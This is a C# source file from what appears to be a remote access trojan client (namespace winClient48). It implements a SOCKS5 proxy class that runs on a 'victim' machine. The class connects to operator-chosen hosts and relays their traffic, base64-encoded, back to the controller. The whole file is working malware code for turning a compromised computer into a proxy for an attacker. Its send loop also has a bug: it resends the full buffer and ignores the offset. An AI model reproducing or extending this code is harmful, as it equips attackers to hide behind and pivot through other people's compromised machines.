using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace winClient48
{
    public class clsSocks5 : IDisposable
    {
        private clsVictim m_vicParent { get; set; }
        private int m_nStreamId = -1;
        private string m_szIPv4 { get; set; }
        private int m_nPort = -1;

        private Socket m_sktClnt { get; set; }
        private bool m_bIsRunning = false;
        private readonly object m_mtxSend = new object();
        private Thread m_thdParent { get; set; }
        private Thread m_thdVictim { get; set; }

        public clsSocks5(clsVictim vicParent, int nStreamId, string szIPv4, int nPort)
        {
            m_vicParent = vicParent;
            m_nStreamId = nStreamId;
            m_szIPv4 = szIPv4;
            m_nPort = nPort;

            m_sktClnt = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        }

        public void Dispose()
        {
            fnClose();
        }

        public bool fnOpen()
        {
            try
            {
                m_sktClnt.Connect(m_szIPv4, m_nPort);
                m_bIsRunning = true;

                m_thdVictim = new Thread(fnRecvFromVictim);
                m_thdVictim.Start();

                return true;
            }
            catch (Exception ex)
            {
                
                return false;
            }
        }

        public void fnClose()
        {
            if (!m_bIsRunning)
                return;

            m_bIsRunning = false;

            if (m_sktClnt != null)
            {
                try { m_sktClnt.Close(); } catch { }
                try { m_sktClnt.Dispose(); } catch { }

                m_sktClnt = null;
            }
        }

        public bool fnSendAll(byte[] abBuffer, int nLen)
        {
            int nSent = 0;
            while (nSent < nLen)
            {
                int n = m_sktClnt.Send(abBuffer);
                if (n <= 0)
                    return false;

                nSent += n;
            }

            return true;
        }

        public void fnForwarding(byte[] abBuffer)
        {
            if (!m_bIsRunning || !m_sktClnt.Connected)
                return;

            lock (m_mtxSend)
            {
                if (!fnSendAll(abBuffer, abBuffer.Length))
                {
                    fnClose();
                }
            }
        }

        private void fnRecvFromVictim()
        {
            byte[] abBuffer = new byte[8192];
            while (m_bIsRunning)
            {
                int nRecv = m_sktClnt.Receive(abBuffer);
                if (nRecv <= 0)
                    break;

                string szBase64 = Convert.ToBase64String(abBuffer, 0, nRecv);

                m_vicParent.fnSendCommand(new string[]
                {
                    "proxy",
                    "socks5",
                    "data",
                    m_nStreamId.ToString(),
                    szBase64
                });
            }

            m_vicParent.fnSendCommand(new string[]
            {
                "proxy",
                "socks5",
                "close",
                m_nStreamId.ToString()
            });

            m_bIsRunning = false;
        }
    }
}
